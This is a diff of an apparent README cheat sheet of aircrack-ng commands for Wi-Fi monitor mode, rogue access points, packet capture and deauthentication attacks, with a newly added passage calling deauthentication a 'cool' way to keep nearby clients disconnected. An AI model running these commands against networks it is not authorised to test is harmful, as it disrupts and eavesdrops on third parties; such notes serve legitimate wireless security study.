@@ -4,7 +4,7 @@
     <summary> Basic Information</summary>
 These commands are works only on linux based OS system
 An external Network Adapter is required, Your Network Adapter must support
-<font color="green">Monitor Mode, packet injection mode</font> Here my network interface name is <font color="green">wlan1</font>, use these commands
+{ Monitor Mode, packet injection } mode Here my network interface name is { wlan1 }, use these commands 
 
 ```sh
 iwconfig 
@@ -30,7 +30,7 @@ sudo su
 
 ---
 ## Network Manager Commands
-### kill network manager
+### Kill Network Manager
 ```
 airmon-ng check kill
 ```
@@ -67,19 +67,19 @@ airbase-ng -a 00:01:02:03:04:05 --essid "test_01" -c 11 wlan1
 ```
 ---
 ## Packet Sniffing
-### sniff network around us `2.4 GHz`
+### Sniff Network around `2.4 GHz`
 ```
 airodump-ng wlan1
 ```
-### sniff network Both `2.4 GHz and 5 GHz`
+### Sniff Network Both `2.4 GHz and 5 GHz`
 ```
 airodump-ng --band a wlan1
 ```
-### capture data both `2.4 GHz and 5 GHz`
+### Capture data both `2.4 GHz and 5 GHz`
 ```
 airodump-ng --band abg wlan1
 ```
-### capture data in a file `test`
+### Capture data in a file `test`
 ```
 airodump-ng --bssid @1 --channel @2 --write test wlan1
 ```
@@ -87,12 +87,17 @@ airodump-ng --bssid @1 --channel @2 --write test wlan1
 
 @2 → Channel no. of target
 
-### open wireshark application to read captured data, captured in `fileName.cap`, 
+### Open wireshark application to read captured data, captured in `fileName.cap`, 
 ```
 wireshark
 ```
 ---
-## DE-Authentication Attack
+## DE-Authentication Attack 
+<details>
+    <summary>why de-authentication ?</summary>
+it`s cool and amazing attack on your nearest device & router, it uses { aireplay } package and takes MAC address of Router & Client and keep sending deauthentication packet to Router & Client as well, you can send really large no. of packets and keep client disconnect as you want.
+</details>
+
 ```
 aireplay-ng --deauth @1 -a @2 -c @3 wlan1
 ```
